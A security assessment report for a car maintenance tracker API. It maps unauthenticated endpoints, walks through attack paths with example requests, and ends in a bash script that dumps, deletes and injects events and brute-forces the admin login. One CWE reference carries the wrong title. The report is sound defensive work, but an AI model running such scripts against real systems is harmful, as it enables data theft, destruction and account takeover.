# API Endpoint Security Status - Car Maintenance Tracker

## AUTHENTICATION & AUTHORIZATION MATRIX

| Endpoint | Method | Auth Required | Role | Status | Severity | Pre-Auth |
|----------|--------|:-------------:|:----:|:------:|:--------:|:--------:|
| `/api/setup` | GET | ❌ NO | - | 🔴 UNSAFE | HIGH | ✅ YES |
| `/api/setup` | POST | ❌ NO | admin | 🔴 UNSAFE | CRITICAL | ✅ YES |
| `/api/login` | POST | ❌ NO | - | 🟠 WEAK | CRITICAL | ✅ YES |
| `/api/logout` | GET | ✅ YES | any | 🟢 OK | - | ❌ |
| `/api/current_user` | GET | ✅ YES | any | 🟢 OK | - | ❌ |
| `/api/users` | POST | ✅ YES | admin | 🟢 OK | - | ❌ |
| `/api/active_users` | GET | ✅ YES | admin | 🟢 OK | - | ❌ |
| `/api/settings` | PUT | ✅ YES | any | 🟢 OK | - | ❌ |
| `/api/change_password` | PUT | ✅ YES | any | 🟠 WEAK | MEDIUM | ❌ |
| **`/api/events`** | **GET** | **❌ NO** | **-** | **🔴 UNSAFE** | **CRITICAL** | **✅ YES** |
| **`/api/events`** | **POST** | **❌ NO** | **-** | **🔴 UNSAFE** | **CRITICAL** | **✅ YES** |
| **`/api/events/{id}`** | **PUT** | **❌ NO** | **-** | **🔴 UNSAFE** | **CRITICAL** | **✅ YES** |
| **`/api/events/{id}`** | **DELETE** | **❌ NO** | **-** | **🔴 UNSAFE** | **CRITICAL** | **✅ YES** |
| `/` | GET | ❌ NO | - | 🟢 OK | - | - |
| `/locales/*` | GET | ❌ NO | - | 🟢 OK | - | - |
| `/styles.css` | GET | ❌ NO | - | 🟢 OK | - | - |

---

## CRITICAL PATHS (Pre-Authentication)

### 🔴 Path 1: Read All Maintenance Data
```
Attacker Request:
  GET /api/events HTTP/1.1
  Host: tracker.local
  
Result:
  ✅ 200 OK
  {
    "events": [
      {
        "id": "event-123",
        "title": "Oil Change",
        "date": "2026-02-15",
        "cost": 75.00,
        "notes": "Dealership service"
      },
      ...
    ]
  }

Impact: 🔓 Complete confidentiality breach
  - All maintenance schedules exposed
  - Service history visible
  - Cost information exposed
  - Facility information in notes
```

### 🔴 Path 2: Corrupt/Delete All Events
```
Attacker Sequence:
  1. GET /api/events → Get all event IDs
  2. For each event:
     DELETE /api/events/{id} → Delete
  
Result:
  All maintenance tracking deleted
  
Impact: 🔓 Complete availability breach (DoS)
```

### 🔴 Path 3: Inject Malicious Events
```
Attacker Request:
  POST /api/events HTTP/1.1
  Content-Type: application/json
  
  {
    "title": "Malware planted at coordinates...",
    "date": "2026-01-01",
    "cost": 0,
    "notes": "Call this number: +1-555-1234"
  }

Result:
  Fake event injected into system
  
Impact: 🔓 Complete integrity breach
```

### 🟠 Path 4: Brute Force Admin Password
```
Attacker Loop:
  for password in wordlist.txt:
    POST /api/login
    {"username": "admin", "password": password}
    
Expected:
  ✅ 401 Unauthorized (wrong password)
  
Actual:
  ✅ Unlimited attempts allowed, no rate limiting
  ✅ After ~3 seconds can try 1000 passwords
  
Impact: ⚠️ Weak passwords can be cracked instantly
```

### 🟠 Path 5: Multiple Concurrent Setups (Race Condition)
```
Attacker Scripts (Run Simultaneously):
  Script 1:
    POST /api/setup
    {"username": "attacker1", "password": "pass1"}
    
  Script 2:
    POST /api/setup
    {"username": "attacker2", "password": "pass2"}
    
Current Behavior:
  - Unclear which succeeds
  - Data might be corrupted
  - Multiple admins possible
  
Impact: 🔓 Access control bypass
```

---

## AUTHENTICATED PATHS (Lower Priority)

### 🟠 Issue: Read-Only Users Can Modify Events
```
Logged-in as read_only user:
  POST /api/events → ✅ Can create events (shouldn't be allowed)
  PUT /api/events/{id} → ✅ Can update events (shouldn't be allowed)
  DELETE /api/events/{id} → ✅ Can delete events (shouldn't be allowed)

Impact: ⚠️ Role-based access control not enforced
```

### 🟢 Issue: No Audit Trail
```
Admin malicious action:
  1. Create fake event
  2. Delete real event
  3. Logout
  
Investigation:
  No audit log to track who deleted what
  
Impact: ⚠️ Compliance issue, forensics impossible
```

---

## QUICK FIX CHECKLIST

Priority 1 (This Week):
- [ ] Add authentication check to:
  - [ ] GET /api/events
  - [ ] POST /api/events
  - [ ] PUT /api/events/{id}
  - [ ] DELETE /api/events/{id}
- [ ] Add rate limiting to POST /api/login
- [ ] Add file locking to POST /api/setup

Priority 2 (Next Week):
- [ ] Add RBAC checks (read-only users block write access)
- [ ] Implement session persistence (Redis)
- [ ] Add audit logging

Priority 3 (Next Sprint):
- [ ] Add account lockout (after N failed attempts)
- [ ] Add security headers
- [ ] Add input validation (date bounds, etc)

---

## EXAMPLE ATTACK EXECUTION

```bash
#!/bin/bash
# Automated attack against Car Maintenance Tracker

TARGET="http://localhost:3000"

echo "[*] Step 1: Steal all maintenance data"
curl -s $TARGET/api/events | jq . > stolen_events.json
echo "[+] Saved to stolen_events.json"

echo "[*] Step 2: Corrupt database"
curl -s $TARGET/api/events | jq -r '.[].id' | while read id; do
  curl -X DELETE $TARGET/api/events/$id
  echo "[+] Deleted event: $id"
done

echo "[*] Step 3: Inject malicious events"
curl -X POST $TARGET/api/events \
  -H "Content-Type: application/json" \
  -d '{
    "title": "SYSTEM COMPROMISED",
    "date": "2026-01-01",
    "cost": 0,
    "notes": "Database has been accessed and modified"
  }'
echo "[+] Malicious event injected"

echo "[*] Step 4: Attempt brute force"
passwords=("password" "admin" "123456" "12345678" "password123")
for pass in "${passwords[@]}"; do
  response=$(curl -s -X POST $TARGET/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$pass\"}")
  
  if echo "$response" | grep -q "user_id"; then
    echo "[+] PASSWORD FOUND: $pass"
    break
  fi
done

echo "[+] Attack complete"
```

**This attack would succeed with current code.**

---

## DEPENDENCIES & CVE STATUS

✅ Safe Versions (No Known CVEs):
- axum 0.8
- serde 1.0
- tokio 1.40
- bcrypt 0.15
- hyper 0.14

Verify with: `cargo audit`

---

## REFERENCES

- OWASP Top 10 2021: A01:2021 - Broken Access Control
- OWASP Top 10 2021: A07:2021 - Identification and Authentication Failures
- CWE-287: Improper Authentication
- CWE-306: Missing Authentication for Critical Function
- CWE-307: Improper Restriction of Rendered UI Layers or Frames
- CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition

---

**Assessment Date**: April 21, 2026  
**Risk Level**: 🔴 CRITICAL - Application unsafe for production  
**Recommended Action**: Do not deploy until Critical issues are fixed
